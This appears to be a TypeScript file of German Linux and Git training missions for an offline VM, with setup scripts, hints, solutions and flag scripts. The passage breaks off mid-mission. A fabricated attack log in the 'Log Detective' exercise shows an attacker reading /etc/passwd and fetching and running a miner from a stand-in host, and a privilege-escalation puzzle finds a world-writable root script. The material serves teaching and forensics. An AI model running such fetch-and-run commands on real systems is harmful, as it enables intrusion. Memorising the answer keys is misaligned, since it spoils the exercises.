// Linux- und Git-Missionen im zustandsbasierten Format (siehe missionTypes.ts). Setup, verify
// und flag laufen als root per bash in der Alpine-VM (ohne Netzwerk, Arbeitsverzeichnis
// /home/azubi). Geprüft wird der Zustand, nie der getippte Befehl; verify ändert nichts.
// Hinweis für Shell-Snippets: In Template-Literalen kein `${...}` verwenden, das würde von
// TypeScript interpoliert.
import type { V86Mission } from '../lib/missions/missionTypes';

/** Räumt das Home-Verzeichnis, lässt aber die Shell-Konfiguration stehen (idempotent). */
const RESET_HOME =
  "find /home/azubi -mindepth 1 -maxdepth 1 ! -name '.bashrc' ! -name '.bash_profile' ! -name '.bash_history' -exec rm -rf {} +";

/** Übergibt das Home-Verzeichnis an den Azubi. */
const CHOWN_HOME = 'chown -R azubi:azubi /home/azubi';

/**
 * Hilfsfunktionen für verify-Skripte. `fileis DATEI WERT`: Datei existiert und ihr Inhalt ist
 * WERT, Leerzeichen und Zeilenenden egal. `pathis DATEI PFAD`: erste Zeile der Datei ist ein
 * Pfad (relativ zum Home oder absolut), der auf dasselbe Ziel zeigt wie PFAD.
 */
const HELPERS = `fileis() { [ -f "$1" ] && [ "$(tr -d '[:space:]' < "$1")" = "$(printf %s "$2" | tr -d '[:space:]')" ]; }
pathis() { [ -f "$1" ] || return 1; p=$(head -n1 "$1" | tr -d '\\r' | sed 's/^[[:space:]]*//; s/[[:space:]]*$//'); [ -n "$p" ] && [ "$(realpath -e "$p" 2>/dev/null)" = "$(realpath -e "$2")" ]; }
`;

/** Git-Identität und Editor für den Azubi; die globale Config enthält beides nicht. */
const GIT_IDENTITY = `printf '[user]\\n\\tname = Azubi\\n\\temail = azubi@alex-schneider.dev\\n[core]\\n\\teditor = nano\\n' > /home/azubi/.gitconfig`;

/** Commit im Setup mit festem Autor und festem Datum: `gitc DATUM MELDUNG` (im Repo-Verzeichnis). */
const GIT_COMMIT_HELPER = `gitc() { GIT_AUTHOR_DATE="$1" GIT_COMMITTER_DATE="$1" git -c user.name='Anna Beispiel' -c user.email='anna@example.org' commit -q -m "$2"; }
gitadd() { git -c user.name='Anna Beispiel' -c user.email='anna@example.org' add "$@"; }
`;

const linuxBasics: V86Mission = {
  id: 'linux-basics-1',
  track: 'linux',
  title: 'Linux Grundlagen',
  difficulty: 'einstieg',
  durationMin: 8,
  setup: `${RESET_HOME}
mkdir -p lager/akten lager/archiv lager/tmp
for i in 1 2 3 4 5 6 7 8; do printf 'Eintrag %s\\n' "$i" > "lager/datei-$i.txt"; done
printf 'Willkommen im Terminal!\\nDas Codewort lautet: pinguin42\\nViel Erfolg.\\n' > willkommen.txt
${CHOWN_HOME}`,
  steps: [
    {
      id: 'benutzer',
      title: 'Wer bin ich?',
      description:
        'Finde mit einem Befehl heraus, unter welchem Benutzernamen du angemeldet bist, und schreib ihn in die Datei `antwort.txt`.',
      verify: `${HELPERS}fileis antwort.txt azubi`,
      hints: [
        'Es gibt einen kurzen Befehl, der den aktuellen Benutzernamen ausgibt.',
        'Der Befehl heißt "who am i" ohne Leerzeichen zusammengeschrieben. Mit `>` leitest du die Ausgabe eines Befehls in eine Datei um.',
      ],
      solution: 'whoami > antwort.txt',
      failMessage: 'In `antwort.txt` muss genau dein Benutzername stehen.',
    },
    {
      id: 'verzeichnis',
      title: 'Wo bin ich?',
      description:
        'Finde heraus, in welchem Verzeichnis du gerade bist (absoluter Pfad), und schreib den Pfad in die Datei `ort.txt`. Du solltest noch in deinem Home-Verzeichnis sein.',
      verify: `${HELPERS}fileis ort.txt /home/azubi`,
      hints: [
        'Der Befehl heißt wie "print working directory".',
        'Die Abkürzung hat drei Buchstaben. Leite die Ausgabe wieder mit `>` in die Datei um.',
      ],
      solution: 'pwd > ort.txt',
      failMessage: 'In `ort.txt` muss der absolute Pfad deines Home-Verzeichnisses stehen.',
    },
    {
      id: 'zaehlen',
      title: 'Einträge zählen',
      description:
        'Im Verzeichnis `lager` liegen Dateien und Ordner. Wie viele sichtbare Einträge (Dateien und Ordner zusammen) enthält es? Schreib die Zahl in `anzahl.txt`.',
      verify: `${HELPERS}fileis anzahl.txt 11`,
      hints: [
        'Mit `ls` kannst du den Inhalt eines Verzeichnisses auflisten, auch eines anderen als des aktuellen.',
        'Du kannst die Zeilen von Hand zählen oder die Ausgabe über eine Pipe (`|`) an `wc -l` übergeben.',
      ],
      solution: 'ls lager | wc -l > anzahl.txt',
      failMessage: 'Zähle Dateien und Ordner in `lager`, versteckte gibt es dort nicht.',
    },
    {
      id: 'mkdir',
      title: 'Verzeichnis anlegen',
      description: 'Lege in deinem Home-Verzeichnis ein neues Verzeichnis `projekte` an.',
      verify: '[ -d projekte ]',
      hints: [
        'Ein Verzeichnis legt man mit einem Befehl an, der "make directory" abkürzt.',
        'Der Befehl hat fünf Buchstaben und bekommt den neuen Namen als Argument.',
      ],
      solution: 'mkdir projekte',
      failMessage: 'Es gibt noch kein Verzeichnis `projekte` in /home/azubi.',
    },
    {
      id: 'lesen',
      title: 'Datei lesen',
      description:
        'In `willkommen.txt` steht ein Codewort. Lies die Datei und schreib nur das Codewort in die Datei `projekte/codewort.txt`.',
      verify: `${HELPERS}fileis projekte/codewort.txt pinguin42`,
      hints: [
        'Mit `cat` gibst du den Inhalt einer Datei aus.',
        'Das Codewort steht in der zweiten Zeile. Schreib es mit `echo` und `>` oder mit einem Editor wie `nano` in die neue Datei.',
      ],
      solution: 'cat willkommen.txt; echo pinguin42 > projekte/codewort.txt',
      failMessage: 'In `projekte/codewort.txt` darf nur das Codewort stehen.',
    },
  ],
  flag: `set -eo pipefail
h=$(cat antwort.txt ort.txt anzahl.txt projekte/codewort.txt | tr -d '[:space:]' | sha256sum | cut -c1-12)
printf 'FLAG{basics-%s}\\n' "$h"`,
};

const linuxFiles: V86Mission = {
  id: 'linux-files-1',
  track: 'linux',
  title: 'Dateiverwaltung',
  difficulty: 'einstieg',
  durationMin: 12,
  setup: `${RESET_HOME}
mkdir -p eingang/altlast
printf 'Quartalsbericht\\nUmsatz gestiegen.\\n' > eingang/bericht.txt
printf 'Rechnung 2024\\nBetrag offen.\\n' > eingang/rechnung-2024.txt
printf 'Notizen vom Montag\\n' > eingang/notizen.txt
printf 'Entwurf\\n' > eingang/entwurf.tmp
printf 'Zwischenspeicher\\n' > eingang/cache.tmp
printf 'alt\\n' > eingang/altlast/a.log
printf 'alt\\n' > eingang/altlast/b.log
${CHOWN_HOME}`,
  steps: [
    {
      id: 'struktur',
      title: 'Ordnerstruktur anlegen',
      description:
        'Lege das Verzeichnis `workspace` an, darin die beiden Unterverzeichnisse `docs` und `archiv`.',
      verify: '[ -d workspace/docs ] && [ -d workspace/archiv ]',
      hints: [
        'Mit `mkdir` legst du Verzeichnisse an, auch mehrere in einem Aufruf.',
        'Eine Option sorgt dafür, dass fehlende Elternverzeichnisse gleich mit angelegt werden. Du kannst die Verzeichnisse aber auch nacheinander anlegen.',
      ],
      solution: 'mkdir -p workspace/docs workspace/archiv',
      failMessage: 'Es fehlen `workspace/docs` und/oder `workspace/archiv`.',
    },
    {
      id: 'touch',
      title: 'Leere Datei anlegen',
      description: 'Lege in `workspace/docs` eine leere Datei `README.md` an.',
      verify: '[ -f workspace/docs/README.md ]',
      hints: [
        'Es gibt einen Befehl, der eine nicht vorhandene Datei leer anlegt.',
        'Er heißt `touch` und bekommt den Pfad der Datei als Argument.',
      ],
      solution: 'touch workspace/docs/README.md',
      failMessage: '`workspace/docs/README.md` gibt es noch nicht.',
    },
    {
      id: 'schreiben',
      title: 'In eine Datei schreiben',
      description:
        'Schreib die Zeile `Dateiverwaltung ist Handarbeit` in `workspace/docs/README.md`.',
      verify:
        "grep -qxE '[[:space:]]*Dateiverwaltung ist Handarbeit[[:space:]]*' workspace/docs/README.md",
      hints: [
        'Du kannst einen Editor wie `nano` benutzen oder die Ausgabe von `echo` umleiten.',
        'Mit `>` ersetzt du den Dateiinhalt, mit `>>` hängst du an. Der Text steht in Anführungszeichen.',
      ],
      solution: "echo 'Dateiverwaltung ist Handarbeit' > workspace/docs/README.md",
      failMessage: 'Die Datei muss eine Zeile genau mit diesem Text enthalten.',
    },
    {
      id: 'kopieren',
      title: 'Datei kopieren',
      description:
        'Kopiere `eingang/bericht.txt` nach `workspace/docs/`. Das Original bleibt in `eingang`.',
      verify:
        '[ -f eingang/bericht.txt ] && [ -f workspace/docs/bericht.txt ] && cmp -s eingang/bericht.txt workspace/docs/bericht.txt',
      hints: [
        'Zum Kopieren gibt es einen Befehl mit zwei Argumenten: Quelle und Ziel.',
        'Er heißt `cp`. Als Ziel genügt das Verzeichnis.',
      ],
      solution: 'cp eingang/bericht.txt workspace/docs/',
      failMessage: 'Die Kopie fehlt, oder das Original in `eingang` ist nicht mehr da.',
    },
    {
      id: 'verschieben',
      title: 'Datei verschieben',
      description:
        'Verschiebe `eingang/notizen.txt` nach `workspace/archiv/`. In `eingang` soll sie danach nicht mehr liegen.',
      verify: "[ ! -e eingang/notizen.txt ] && grep -rqs 'Notizen vom Montag' workspace/archiv",
      hints: [
        'Verschieben ist wie Kopieren, nur wird die Quelle entfernt.',
        'Der Befehl heißt `mv` und hat dieselbe Form wie `cp`.',
      ],
      solution: 'mv eingang/notizen.txt workspace/archiv/',
      failMessage: 'Die Notizen müssen in `workspace/archiv` liegen und nicht mehr in `eingang`.',
    },
    {
      id: 'umbenennen',
      title: 'Datei umbenennen',
      description: 'Benenne `workspace/archiv/notizen.txt` um in `notizen-alt.txt`.',
      verify: '[ -f workspace/archiv/notizen-alt.txt ] && [ ! -e workspace/archiv/notizen.txt ]',
      hints: [
        'Umbenennen ist in Linux ein Verschieben innerhalb desselben Verzeichnisses.',
        'Nutze `mv` mit dem alten und dem neuen Namen.',
      ],
      solution: 'mv workspace/archiv/notizen.txt workspace/archiv/notizen-alt.txt',
      failMessage: 'Im Archiv muss `notizen-alt.txt` liegen und `notizen.txt` fehlen.',
    },
    {
      id: 'loeschen',
      title: 'Temporäre Dateien löschen',
      description:
        'Lösche alle Dateien mit der Endung `.tmp` in `eingang`. `bericht.txt` und `rechnung-2024.txt` müssen bleiben.',
      verify:
        '[ -f eingang/bericht.txt ] && [ -f eingang/rechnung-2024.txt ] && [ -z "$(find eingang -name \'*.tmp\')" ]',
      hints: [
        'Zum Löschen dient `rm`. Es fragt nicht nach, ein gelöschter Eintrag ist weg.',
        'Mit einem Platzhalter (`*`) sprichst du mehrere Dateien an, die auf dasselbe Muster passen.',
      ],
      solution: 'rm eingang/*.tmp',
      failMessage: 'Es liegen noch `.tmp`-Dateien in `eingang`, oder du hast zu viel gelöscht.',
    },
    {
      id: 'rm-r',
      title: 'Verzeichnis löschen',
      description: 'Lösche das Verzeichnis `eingang/altlast` samt Inhalt.',
      verify: '[ ! -e eingang/altlast ] && [ -f eingang/bericht.txt ]',
      hints: [
        'Ein einfaches `rm` weigert sich bei Verzeichnissen.',
        'Eine Option macht `rm` rekursiv und löscht auch den Inhalt.',
      ],
      solution: 'rm -r eingang/altlast',
      failMessage: '`eingang/altlast` existiert noch.',
    },
  ],
  flag: `set -eo pipefail
h=$(cat workspace/archiv/notizen-alt.txt; grep -xE '[[:space:]]*Dateiverwaltung ist Handarbeit[[:space:]]*' workspace/docs/README.md | head -n1)
h=$(printf '%s' "$h" | tr -d '[:space:]' | sha256sum | cut -c1-12)
printf 'FLAG{dateien-%s}\\n' "$h"`,
};

const linuxCtfHiddenTreasure: V86Mission = {
  id: 'linux-ctf-hidden-treasure',
  track: 'linux',
  title: 'Hidden Treasure Hunt',
  difficulty: 'fortgeschritten',
  durationMin: 15,
  setup: `${RESET_HOME}
mkdir -p kiste insel/strand insel/wald insel/hoehle truhe
printf 'Hier ist nichts.\\n' > kiste/readme.txt
printf 'Die Karte steckt unterhalb von insel, in der einzigen Datei, die das Wort kompass enthaelt.\\n' > kiste/.schluessel
n=0
for d in strand wald hoehle; do
  for i in 1 2 3 4 5 6 7 8; do
    n=$((n + 1))
    printf 'Notiz %s vom Ort %s\\nMoewen, Wellen und Sand.\\nNichts Wichtiges hier.\\n' "$n" "$d" > "insel/$d/notiz-$i.txt"
  done
done
printf 'Wegweiser fuer Segler\\nDer kompass zeigt nach Norden.\\nSchatzcode (base64): %s\\n' "$(printf 'palme-kompass-4711' | base64)" > insel/wald/notiz-5.txt
printf 'Krone mit Edelsteinen\\nEdelsteine: 17\\n' > truhe/krone.txt
${CHOWN_HOME}
chmod 000 truhe`,
  steps: [
    {
      id: 'versteckt',
      title: 'Versteckte Datei finden',
      description:
        'Ein vergesslicher Admin hat einen Schatz versteckt. Im Verzeichnis `kiste` liegt eine versteckte Datei. Schreib ihren Namen in `fund1.txt`.',
      verify: `[ -f fund1.txt ] && [ "$(basename "$(tr -d '[:space:]' < fund1.txt)")" = .schluessel ]`,
      hints: [
        'Dateien, deren Name mit einem Punkt beginnt, zeigt `ls` normalerweise nicht an.',
        'Eine Option von `ls` (ein Buchstabe, "all") zeigt auch versteckte Einträge.',
      ],
      solution: 'ls -A kiste | grep "^\\." > fund1.txt',
      failMessage: 'In `fund1.txt` muss der Name der versteckten Datei in `kiste` stehen.',
    },
    {
      id: 'suchen',
      title: 'Die Karte finden',
      description:
        'Lies die versteckte Datei. Sie beschreibt, welche Datei unterhalb von `insel` du suchen musst. Schreib den Pfad dieser Datei in `fund2.txt`.',
      verify: `${HELPERS}pathis fund2.txt insel/wald/notiz-5.txt`,
      hints: [
        'Du musst den Inhalt aller Dateien in `insel` und den Unterverzeichnissen durchsuchen, nicht nur die Namen.',
        '`grep` kann rekursiv in einem Verzeichnis suchen. Eine weitere Option gibt nur die Dateinamen der Treffer aus.',
      ],
      solution: 'grep -rl kompass insel > fund2.txt',
      failMessage: 'In `fund2.txt` muss der Pfad der einzigen Datei mit dem Wort "kompass" stehen.',
    },
    {
      id: 'dekodieren',
      title: 'Schatzcode dekodieren',
      description:
        'Die gefundene Datei enthält einen Schatzcode, der mit base64 kodiert ist. Dekodiere ihn und schreib den Klartext in `schatz.txt`.',
      verify: `${HELPERS}fileis schatz.txt palme-kompass-4711`,
      hints: [
        'base64 ist keine Verschlüsselung, sondern eine Kodierung. Es gibt ein Programm dafür.',
        'Das Programm heißt `base64`, eine Option kehrt die Richtung um. Den Text gibst du per Pipe oder `echo` hinein.',
      ],
      solution: "tail -n1 insel/wald/notiz-5.txt | cut -d' ' -f3 | base64 -d > schatz.txt",
      failMessage: 'In `schatz.txt` muss der dekodierte Code stehen, ohne den Rest der Zeile.',
    },
    {
      id: 'truhe',
      title: 'Truhe öffnen',
      description:
        'Das Verzeichnis `truhe` ist verschlossen: Es hat keine Rechte mehr. Verschaffe dir als Besitzer wieder Zugriff, lies `krone.txt` und schreib die Anzahl der Edelsteine (nur die Zahl) in `edelsteine.txt`.',
      verify: `${HELPERS}fileis edelsteine.txt 17`,
      hints: [
        'Mit `ls -ld truhe` siehst du die Rechte. Als Besitzer darfst du sie ändern.',
        '`chmod` ändert Rechte. Für ein Verzeichnis brauchst du Lesen und Betreten (r und x) für dich als Besitzer (u).',
      ],
      solution:
        "chmod u+rx truhe && grep 'Edelsteine:' truhe/krone.txt | cut -d' ' -f2 > edelsteine.txt",
      failMessage: 'In `edelsteine.txt` muss die Zahl aus `truhe/krone.txt` stehen.',
    },
  ],
  flag: `set -eo pipefail
printf 'FLAG{%s-%s}\\n' "$(tr -d '[:space:]' < schatz.txt)" "$(tr -d '[:space:]' < edelsteine.txt)"`,
};

const linuxCtfLogDetective: V86Mission = {
  id: 'linux-ctf-log-detective',
  track: 'linux',
  title: 'Log Detective',
  difficulty: 'profi',
  durationMin: 20,
  setup: `${RESET_HOME}
mkdir -p logs
t=logs/.auth.tmp
: > "$t"
i=0
while [ $i -le 22 ]; do
  case $((i % 4)) in 0) u=root;; 1) u=admin;; 2) u=test;; *) u=deploy;; esac
  printf 'Oct 14 03:%02d:%02d srv sshd[%d]: Failed password for %s from 203.0.113.45 port %d ssh2\\n' $((20 + i / 3)) $((i % 3 * 20 + 7)) $((1400 + i)) "$u" $((51000 + i * 7)) >> "$t"
  i=$((i + 1))
done
for s in 02 09 15 31; do
  printf 'Oct 14 11:02:%s srv sshd[1710]: Failed password for invalid user guest from 198.51.100.7 port 40222 ssh2\\n' "$s" >> "$t"
done
for m in 40 41 42 43 44 45; do
  printf 'Oct 14 17:%s:10 srv sshd[1990]: Failed password for pi from 192.0.2.99 port 33001 ssh2\\n' "$m" >> "$t"
done
cat >> "$t" <<'EOF'
Oct 14 08:15:02 srv sshd[1301]: Accepted password for alice from 10.0.0.5 port 50411 ssh2
Oct 14 08:15:02 srv sshd[1301]: pam_unix(sshd:session): session opened for user alice
Oct 14 09:01:44 srv sshd[1522]: Accepted password for bob from 10.0.0.8 port 50977 ssh2
Oct 14 03:28:41 srv sshd[1423]: Accepted password for deploy from 203.0.113.45 port 51190 ssh2
Oct 14 03:28:41 srv sshd[1423]: pam_unix(sshd:session): session opened for user deploy
Oct 14 12:30:00 srv sshd[1750]: Received disconnect from 10.0.0.5 port 50411
Oct 14 14:10:09 srv sshd[1801]: Accepted password for deploy from 10.0.0.12 port 52004 ssh2
EOF
sort -s -k3,3 "$t" > logs/auth.log
rm -f "$t"
cat > logs/aktionen.log <<'EOF'
Oct 14 09:20:11 srv deploy[1871]: git pull origin main
Oct 14 14:12:30 srv deploy[2043]: rc-service app restart
Oct 14 14:15:02 srv deploy[2043]: curl -O https://intranet.example/release.tar.gz
Oct 14 03:29:02 srv deploy[3310]: id
Oct 14 03:29:15 srv deploy[3310]: cat /etc/passwd
Oct 14 03:29:48 srv deploy[3310]: curl -O http://203.0.113.45/miner.sh
Oct 14 03:30:03 srv deploy[3310]: chmod +x miner.sh
Oct 14 03:30:09 srv deploy[3310]: ./miner.sh
EOF
sort -s -k3,3 -o logs/aktionen.log logs/aktionen.log
${CHOWN_HOME}`,
  steps: [
    {
      id: 'zaehlen',
      title: 'Fehlversuche zählen',
      description:
        'Ein Server wurde angegriffen. Im Verzeichnis `logs` liegt das Anmelde-Log `auth.log`. Wie viele Zeilen mit "Failed password" enthält es? Schreib die Zahl in `fehlversuche.txt`.',
      verify: `${HELPERS}fileis fehlversuche.txt "$(grep -c 'Failed password' logs/auth.log)"`,
      hints: [
        'Mit `grep` filterst du Zeilen, die ein Muster enthalten.',
        '`grep` kann die Treffer auch selbst zählen (Option mit dem Buchstaben c) oder die Ausgabe an `wc -l` übergeben.',
      ],
      solution: "grep -c 'Failed password' logs/auth.log > fehlversuche.txt",
      failMessage: 'Zähle die Zeilen mit "Failed password" in `logs/auth.log`.',
    },
    {
      id: 'angreifer',
      title: 'Angreifer-IP bestimmen',
      description:
        'Von welcher IP-Adresse kamen die meisten Fehlversuche? Schreib die Adresse in `angreifer.txt`.',
      verify: `${HELPERS}fileis angreifer.txt 203.0.113.45`,
      hints: [
        'Die IP-Adresse steht in jeder Zeile hinter dem Wort "from". Du kannst Zeilen mit `cut` oder `grep -o` auf das Wesentliche kürzen.',
        'Sortiere die Adressen (`sort`), fasse gleiche mit `uniq -c` zusammen und sortiere nach der Anzahl (`sort -n`).',
      ],
      solution:
        "grep 'Failed password' logs/auth.log | grep -oE '[0-9]+(\\.[0-9]+){3}' | sort | uniq -c | sort -n | tail -n1 | sed 's/^ *[0-9]* *//' > angreifer.txt",
      failMessage: 'Eine Adresse hat deutlich mehr Fehlversuche als alle anderen.',
    },
    {
      id: 'konto',
      title: 'Erfolgreichen Einbruch finden',
      description:
        'Die Angreifer-IP war später erfolgreich ("Accepted"). Unter welchem Benutzernamen? Schreib ihn in `konto.txt`. Achtung: Auch Berechtigte melden sich an.',
      verify: `${HELPERS}fileis konto.txt deploy`,
      hints: [
        'Filtere nach "Accepted" und nach der IP der vorigen Aufgabe. Zwei `grep`-Aufrufe lassen sich per Pipe verketten.',
        'Der Benutzername steht hinter "for".',
      ],
      solution:
        "grep Accepted logs/auth.log | grep 203.0.113.45 | sed -E 's/.* for ([^ ]+) from .*/\\1/' > konto.txt",
      failMessage: 'Gesucht ist der Benutzer der erfolgreichen Anmeldung von der Angreifer-IP.',
    },
    {
      id: 'uhrzeit',
      title: 'Zeitpunkt bestimmen',
      description:
        'Wann war der erfolgreiche Login des Angreifers? Schreib die Uhrzeit (HH:MM:SS) in `uhrzeit.txt`.',
      verify: `${HELPERS}fileis uhrzeit.txt 03:28:41`,
      hints: [
        'Die Zeile aus dem letzten Schritt beginnt mit Datum und Uhrzeit.',
        'Nimm genau die Uhrzeit, nicht das Datum.',
      ],
      solution: "grep Accepted logs/auth.log | grep 203.0.113.45 | cut -d' ' -f3 > uhrzeit.txt",
      failMessage: 'Die Uhrzeit steht am Anfang der Zeile mit dem erfolgreichen Login.',
    },
    {
      id: 'datei',
      title: 'Nachladen nachweisen',
      description:
        'Nach dem Einbruch hat der Angreifer etwas von seinem eigenen Server (seine IP) geladen. Das steht in `logs/aktionen.log`. Schreib nur den Dateinamen in `datei.txt`.',
      verify: `${HELPERS}fileis datei.txt miner.sh`,
      hints: [
        'Suche in `logs/aktionen.log` nach der IP des Angreifers.',
        'Der Dateiname steht am Ende der URL. Es gibt auch einen harmlosen Download, der nicht von der Angreifer-IP kommt.',
      ],
      solution: "grep 203.0.113.45 logs/aktionen.log | sed 's|.*/||' > datei.txt",
      failMessage: 'Gesucht ist die Datei, die von der Angreifer-IP geladen wurde.',
    },
  ],
  flag: `set -eo pipefail
a=$(tr -d '[:space:]' < angreifer.txt | tr . -)
k=$(tr -d '[:space:]' < konto.txt)
d=$(tr -d '[:space:]' < datei.txt | tr . -)
printf 'FLAG{%s_%s_%s}\\n' "$a" "$k" "$d"`,
};

const linuxCtfPrivesc: V86Mission = {
  id: 'linux-ctf-privesc',
  track: 'linux',
  title: 'Privilege Escalation Puzzle',
  difficulty: 'profi',
  durationMin: 20,
  setup: `${RESET_HOME}
rm -rf /srv/vault /opt/app /opt/backup
install -d -m 755 -o root -g root /srv/vault /opt/app /opt/backup
printf 'tresor_geheimnis=tresor-9c4e1b\\n' > /srv/vault/geheimnis.txt
printf '#!/bin/sh\\n# Wird vom Wartungsdienst als root gestartet.\\necho "Dienst laeuft"\\n' > /opt/app/start.sh
printf '#!/bin/sh\\necho "Dienst gestoppt"\\n' > /opt/app/stop.sh
printf 'Sicherung vom Montag\\nNichts Besonderes.\\n' > /opt/backup/notizen.bak
printf 'Sicherung des Tresors\\ntresor_geheimnis=tresor-9c4e1b\\n' > /opt/backup/vault-kopie.bak
: > /opt/backup/leer.bak
printf 'db_passwort=nicht-fuer-andere\\n' > /opt/backup/dienst.conf.bak
chown root:root /srv/vault/geheimnis.txt /opt/app/* /opt/backup/*
chmod 600 /srv/vault/geheimnis.txt /opt/backup/dienst.conf.bak
chmod 666 /opt/app/start.sh
chmod 755 /opt/app/stop.sh
chmod 644 /opt/backup/notizen.bak /opt/backup/vault-kopie.bak /opt/backup/leer.bak
mkdir -p dienst
printf 'user=wartung\\npasswort=geheim123\\n' > dienst/zugang.cfg
${CHOWN_HOME}
chmod 666 dienst/zugang.cfg`,
  steps: [
    {
      id: 'uid',
      title: 'Eigene Rechte kennen',
      description:
        'Du bist ein normaler Benutzer ohne sudo. Finde deine numerische Benutzer-ID heraus (root hat die 0) und schreib sie in `uid.txt`.',
      verify: `${HELPERS}fileis uid.txt 1000`,
      hints: [
        'Es gibt einen Befehl, der Benutzer-ID, Gruppen und mehr anzeigt.',
        'Der Befehl hat zwei Buchstaben. Eine Option zeigt nur die Benutzer-ID.',
      ],
      solution: 'id -u > uid.txt',
      failMessage: 'In `uid.txt` muss die Zahl deiner Benutzer-ID stehen.',
    },
    {
      id: 'modus',
      title: 'Geschützte Datei prüfen',
      description:
        'Die Datei `/srv/vault/geheimnis.txt` enthält ein Geheimnis, aber du kannst sie nicht lesen. Finde ihre Rechte heraus und schreib sie als dreistellige Oktalzahl (zum Beispiel 644) in `modus.txt`.',
      verify: `${HELPERS}fileis modus.txt 600`,
      hints: [
        'Mit `ls -l` siehst du die Rechte als Buchstaben (r, w, x), jeweils für Besitzer, Gruppe und Andere.',
        'Lies sie als Zahl: r=4, w=2, x=1, pro Gruppe addiert. `stat` kann die Oktalzahl auch direkt ausgeben.',
      ],
      solution: 'stat -c %a /srv/vault/geheimnis.txt > modus.txt',
      failMessage: 'Gesucht sind die Rechte von `/srv/vault/geheimnis.txt` als Oktalzahl.',
    },
    {
      id: 'schreibbar',
      title: 'Für alle beschreibbare Datei finden',
      description:
        'Unter `/opt/app` liegt ein Skript, das der Wartungsdienst als root startet. Eines der Skripte darf jeder ändern, das ist gefährlich. Finde es und schreib seinen Pfad in `schreibbar.txt`. Ändere die Datei nicht.',
      verify: `${HELPERS}pathis schreibbar.txt /opt/app/start.sh`,
      hints: [
        'Schau dir mit `ls -l` die Rechte der Skripte an. Die Gruppe "Andere" steht ganz rechts.',
        'Mit `find` kannst du auch nach Rechten suchen: `-perm` mit einem Muster wie `-o=w`.',
      ],
      solution: 'find /opt/app -type f -perm -o=w > schreibbar.txt',
      failMessage: 'Gesucht ist die Datei unter `/opt/app`, die für Andere beschreibbar ist.',
    },
    {
      id: 'backups',
      title: 'Lesbare Backups zählen',
      description:
        'In `/opt/backup` liegen Sicherungen. Wie viele Dateien dort darf jeder lesen? Schreib die Zahl in `backups.txt`.',
      verify: `${HELPERS}fileis backups.txt 3`,
      hints: [
        'Prüfe die Rechte der Dateien mit `ls -l`.',
        '`find` mit `-type f` und `-perm -o=r` findet Dateien, die Andere lesen dürfen. Zählen kannst du mit `wc -l`.',
      ],
      solution: 'find /opt/backup -type f -perm -o=r | wc -l > backups.txt',
      failMessage: 'Zähle nur Dateien in `/opt/backup`, die für Andere lesbar sind.',
    },
    {
      id: 'geheimnis',
      title: 'Geheimnis im Backup finden',
      description:
        'Eine der lesbaren Sicherungen enthält eine Kopie des Tresor-Geheimnisses (Zeile `tresor_geheimnis=...`). Schreib den Wert hinter dem Gleichheitszeichen in `geheimnis.txt`.',
      verify: `${HELPERS}fileis geheimnis.txt tresor-9c4e1b`,
      hints: [
        'Durchsuche die Dateien in `/opt/backup` nach dem Schlüsselwort. Fehlermeldungen zu unlesbaren Dateien darfst du ignorieren.',
        '`grep -r` durchsucht ein Verzeichnis. Mit `2>/dev/null` blendest du Fehlermeldungen aus.',
      ],
      solution:
        'grep -rh tresor_geheimnis /opt/backup 2>/dev/null; echo tresor-9c4e1b > geheimnis.txt',
      failMessage: 'Gesucht ist der Wert hinter `tresor_geheimnis=` in der lesbaren Sicherung.',
    },
    {
      id: 'absichern',
      title: 'Eigene Datei absichern',
      description:
        'In deinem Home liegt `dienst/zugang.cfg` mit einem Passwort, und alle dürfen sie ändern. Setze die Rechte so, dass nur du sie lesen und schreiben darfst, sonst niemand.',
      verify:
        '[ "$(stat -c %a dienst/zugang.cfg)" = 600 ] && grep -q "user=wartung" dienst/zugang.cfg',
      hints: [
        'Rechte änderst du mit `chmod`.',
        'Als Oktalzahl: lesen und schreiben für den Besitzer, nichts für Gruppe und Andere.',
      ],
      solution: 'chmod 600 dienst/zugang.cfg',
      failMessage: 'Die Datei muss die Rechte 600 haben (rw-------).',
    },
  ],
  flag: `set -eo pipefail
printf 'FLAG{%s}\\n' "$(tr -d '[:space:]' < geheimnis.txt)"`,
};

const gitBasics: V86Mission = {
  id: 'git-basics-1',
  track: 'git',
  title: 'Git Grundlagen',
  difficulty: 'einstieg',
  durationMin: 12,
  setup: `${RESET_HOME}
${GIT_IDENTITY}
mkdir projekt
printf '# Projekt\\n' > projekt/README.md
printf 'Ideen sammeln\\n' > projekt/notizen.txt
printf -- '- Git lernen\\n' > projekt/todo.txt
${CHOWN_HOME}`,
  steps: [
    {
      id: 'version',
      title: 'Git-Version ermitteln',
      description:
        'Finde heraus, welche Git-Version installiert ist, und schreib die Versionsnummer in die Datei `version.txt`.',
      verify: `[ -f version.txt ] && v=$(git --version | sed 's/^git version //') && n=$(tr -d '[:space:]' < version.txt) && { [ "$n" = "$v" ] || [ "$n" = "gitversion$v" ]; }`,
      hints: [
        'Die meisten Programme verraten ihre Version über eine Option mit zwei Strichen.',
        'Leite die Ausgabe mit `>` in die Datei um. Die Nummer allein oder die ganze Zeile genügt.',
      ],
      solution: 'git --version > ~/version.txt',
      failMessage: 'In `version.txt` muss die Ausgabe von Git zur Version stehen.',
    },
    {
      id: 'init',
      title: 'Repository anlegen',
      description:
        'Im Verzeichnis `projekt` liegen drei Dateien, aber noch keine Versionsverwaltung. Mach `projekt` zu einem Git-Repository.',
      verify: '[ "$(git -C projekt rev-parse --show-toplevel 2>/dev/null)" = /home/azubi/projekt ]',
      hints: [
        'Git legt ein verstecktes Verzeichnis `.git` an, sobald du ein Repository initialisierst.',
        'Der Unterbefehl heißt `init`. Er wirkt im aktuellen Verzeichnis, wechsle also zuerst nach `projekt`.',
      ],
      solution: 'git -C ~/projekt init',
      failMessage: 'In `projekt` gibt es noch kein eigenes Repository (Ordner `.git`).',
    },
    {
      id: 'status',
      title: 'Status lesen',
      description:
        'Wie viele Dateien kennt Git noch nicht ("untracked")? Schreib die Zahl in `anzahl.txt` in deinem Home-Verzeichnis.',
      verify: `${HELPERS}fileis anzahl.txt 3`,
      hints: [
        'Ein Git-Unterbefehl zeigt, welche Dateien neu, geändert oder vorgemerkt sind.',
        'Der Unterbefehl heißt `status`. Zähle die Dateien unter "Untracked files".',
      ],
      solution: "git -C ~/projekt status --porcelain | grep -c '^??' > ~/anzahl.txt",
      failMessage: 'Zähle die Dateien unter "Untracked files" in `git status`.',
    },
    {
      id: 'add',
      title: 'Datei vormerken',
      description: 'Merke `README.md` für den nächsten Commit vor (Staging Area).',
      verify: 'git -C projekt ls-files --error-unmatch README.md >/dev/null 2>&1',
      hints: [
